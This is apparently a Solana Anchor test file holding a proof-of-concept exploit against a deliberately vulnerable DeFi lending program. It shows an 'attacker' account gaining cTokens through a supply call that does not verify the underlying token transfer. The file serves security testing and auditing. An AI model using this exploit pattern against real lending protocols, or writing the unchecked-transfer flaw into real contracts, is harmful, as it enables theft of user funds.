import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { VulnerableDefiProtocol } from "../target/types/vulnerable_defi_protocol";
import { 
  createMint, getOrCreateAssociatedTokenAccount, mintTo, getAccount, TOKEN_PROGRAM_ID
} from "@solana/spl-token";
import { assert } from "chai";

// POC #3 & #4: Missing Balance Subtraction + Unverified Token Transfer

describe("POC #3 & #4 - Supply credits cTokens without verified transfer", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.VulnerableDefiProtocol as Program<VulnerableDefiProtocol>;

  let admin: anchor.web3.Keypair;
  let attacker: anchor.web3.Keypair;
  let supplyMint: anchor.web3.PublicKey;
  let collateralMint: anchor.web3.PublicKey;
  let marketPDA: anchor.web3.PublicKey;
  let vault: anchor.web3.PublicKey;
  let configKeypair: anchor.web3.Keypair;

  before(async () => {
    admin = anchor.web3.Keypair.generate();
    attacker = anchor.web3.Keypair.generate();
    const airdropAmount = 10 * anchor.web3.LAMPORTS_PER_SOL;
    for (const kp of [admin, attacker]) {
      await provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(kp.publicKey, airdropAmount)
      );
    }

    supplyMint = await createMint(provider.connection, admin, admin.publicKey, null, 6);
    collateralMint = await createMint(provider.connection, admin, admin.publicKey, null, 6);

    // Initialize config
    configKeypair = anchor.web3.Keypair.generate();
    await program.methods
      .initialize(admin.publicKey)
      .accounts({
        config: configKeypair.publicKey,
        signer: admin.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([admin, configKeypair])
      .rpc();

    const legitOracle = anchor.web3.Keypair.generate();
    await program.methods
      .createOracle(new anchor.BN(1_000_000))
      .accounts({ oracle: legitOracle.publicKey, signer: admin.publicKey, systemProgram: anchor.web3.SystemProgram.programId } as any)
      .signers([admin, legitOracle])
      .rpc();

    const marketId = new anchor.BN(3);
    [marketPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("market"), marketId.toArrayLike(Buffer, "le", 8), supplyMint.toBuffer(), collateralMint.toBuffer()],
      program.programId
    );

    const vaultAccount = await getOrCreateAssociatedTokenAccount(provider.connection, admin, supplyMint, marketPDA, true);
    vault = vaultAccount.address;

    await mintTo(provider.connection, admin, supplyMint, vault, admin.publicKey, 1_000_000_000);

    await program.methods
      .createMarket(marketId)
      .accounts({
        market: marketPDA,
        config: configKeypair.publicKey,
        supplyMint,
        collateralMint,
        supplyOracle: legitOracle.publicKey,
        collateralOracle: legitOracle.publicKey,
        vault,
        authority: admin.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([admin])
      .rpc();
  });

  it("Supply mints cTokens even without checking transfer", async () => {
    const attackerTokenAccountInfo = await getOrCreateAssociatedTokenAccount(provider.connection, attacker, supplyMint, attacker.publicKey);
    const attackerTokenAccount = attackerTokenAccountInfo.address;

    await mintTo(provider.connection, admin, supplyMint, attackerTokenAccount, admin.publicKey, 1000);

    const [userSupplyPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("user_supply"), attacker.publicKey.toBuffer(), marketPDA.toBuffer()],
      program.programId
    );

    const beforeBalance = await getAccount(provider.connection, attackerTokenAccount);

    await program.methods
      .supply(new anchor.BN(500))
      .accounts({
        market: marketPDA,
        userSupplyAccount: userSupplyPDA,
        userTokenAccount: attackerTokenAccount,
        vault,
        user: attacker.publicKey,
        tokenProgram: TOKEN_PROGRAM_ID,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([attacker])
      .rpc();

    const userSupplyData = await program.account.userSupplyAccount.fetch(userSupplyPDA);
    const afterBalance = await getAccount(provider.connection, attackerTokenAccount);

    assert.equal(userSupplyData.ctokenBalance.toString(), "500");
    // Note: Program doesn't verify transfer result; demonstration focuses on cToken crediting.
    assert.isTrue(Number(afterBalance.amount) <= Number(beforeBalance.amount), "Balance should not increase");
  });
});
